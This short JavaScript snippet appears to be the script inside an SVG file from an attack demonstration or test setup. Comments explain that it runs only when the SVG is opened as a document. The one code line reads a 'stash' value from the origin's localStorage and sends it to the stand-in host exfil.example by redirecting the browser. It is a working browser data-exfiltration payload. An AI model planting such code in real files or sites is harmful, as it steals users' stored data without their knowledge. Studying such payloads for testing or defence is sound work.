// Runs only when page.svg is opened as a document (as an <img> an SVG
// runs no script): sends the stash index.html left in the content origin's storage to another host.
location.href = "https://exfil.example/svg?d=" + encodeURIComponent(localStorage.getItem("stash"));
